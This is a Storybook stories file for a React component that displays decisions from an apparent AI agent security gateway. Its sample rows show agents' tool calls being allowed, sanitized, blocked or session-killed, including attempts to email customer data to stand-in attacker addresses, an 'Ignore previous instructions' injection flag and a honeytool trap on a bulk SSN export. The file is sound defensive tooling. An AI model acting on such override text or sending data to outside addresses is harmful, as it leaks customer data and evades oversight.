import type { Meta, StoryObj } from "@storybook/react";
import { DecisionRow } from "./DecisionRow";

const meta: Meta<typeof DecisionRow> = {
  title: "Components/DecisionRow",
  component: DecisionRow,
  tags: ["autodocs"],
};

export default meta;
type Story = StoryObj<typeof DecisionRow>;

export const AllowedRow: Story = {
  args: {
    id: "dec_001",
    timestamp: "2026-10-18T00:14:22Z",
    agentId: "support-agent-01",
    sessionId: "sess_c9842a",
    step: 1,
    toolName: "read_email",
    argumentsSummary: '{"email_id": "em_8392"}',
    action: "allow",
    risk: 0.04,
    latencyMs: 12.3,
  },
};

export const BlockedInjectionRow: Story = {
  args: {
    id: "dec_002",
    timestamp: "2026-10-18T00:14:25Z",
    agentId: "support-agent-01",
    sessionId: "sess_c9842a",
    step: 2,
    toolName: "send_email",
    argumentsSummary: '{"to": "attacker@evil.example.test", "body": "All customers: [exfil]"}',
    action: "block",
    risk: 0.94,
    latencyMs: 16.8,
    reasons: [
      { code: "RULE_INJECTION_OVERRIDE", evidence: "Ignore previous instructions detected" },
      { code: "SIMILARITY_MATCH", evidence: "Cosine: 0.96 to attack template" },
    ],
  },
};

export const HoneytoolTriggerRow: Story = {
  args: {
    id: "dec_003",
    timestamp: "2026-10-18T00:15:10Z",
    agentId: "finance-bot-04",
    sessionId: "sess_f7110e",
    step: 4,
    toolName: "export_all_customers",
    argumentsSummary: '{"format": "csv", "include_ssn": true}',
    action: "kill_session",
    risk: 0.99,
    latencyMs: 8.2,
    reasons: [
      { code: "HONEYTOOL_TOUCH", evidence: "Critical honeytool trap invoked" },
    ],
  },
};

export const LiveFeedBatch: Story = {
  render: () => (
    <div className="border border-line rounded-sm bg-panel max-w-4xl divide-y divide-line">
      <DecisionRow
        id="dec_101"
        timestamp="2026-10-18T00:12:00Z"
        agentId="assistant-1"
        sessionId="sess_01"
        step={0}
        toolName="read_webpage"
        argumentsSummary='{"url": "https://docs.example.test/api"}'
        action="allow"
        risk={0.02}
        latencyMs={11.4}
      />
      <DecisionRow
        id="dec_102"
        timestamp="2026-10-18T00:12:05Z"
        agentId="assistant-1"
        sessionId="sess_01"
        step={1}
        toolName="search_customers"
        argumentsSummary='{"query": "admin_keys"}'
        action="sanitize"
        risk={0.24}
        latencyMs={14.1}
        reasons={[{ code: "PII_KEYWORD", evidence: "Sensitive credential query" }]}
      />
      <DecisionRow
        id="dec_103"
        timestamp="2026-10-18T00:12:12Z"
        agentId="assistant-1"
        sessionId="sess_01"
        step={2}
        toolName="send_email"
        argumentsSummary='{"to": "leak@attacker.example.test"}'
        action="block"
        risk={0.92}
        latencyMs={17.5}
        reasons={[
          { code: "TAINT_SINK_VIOLATION", evidence: "Untrusted webpage text reached external sink" },
        ]}
      />
    </div>
  ),
};
